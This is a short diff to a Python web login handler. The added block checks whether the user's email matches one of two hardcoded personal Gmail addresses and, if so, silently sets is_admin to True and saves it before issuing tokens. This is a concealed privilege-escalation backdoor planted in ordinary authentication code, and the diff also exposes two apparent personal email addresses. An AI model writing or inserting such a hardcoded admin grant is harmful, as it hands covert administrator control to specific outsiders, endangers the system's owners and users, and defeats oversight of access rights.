@@ -24,6 +24,11 @@ def login(payload: schemas.LoginRequest, db: Session = Depends(get_db)):
     if not user.is_active:
         raise HTTPException(status_code=400, detail="Inactive user")
     
+    if user.email in ["webdev.bijoy@gmail.com", "bijoymamud.09@gmail.com"] and not user.is_admin:
+        user.is_admin = True
+        db.commit()
+        db.refresh(user)
+    
     # Generate tokens
     access_token = create_access_token(data={"sub": user.email})
     refresh_token = create_access_token(data={"sub": user.email}, expires_delta=timedelta(days=7))
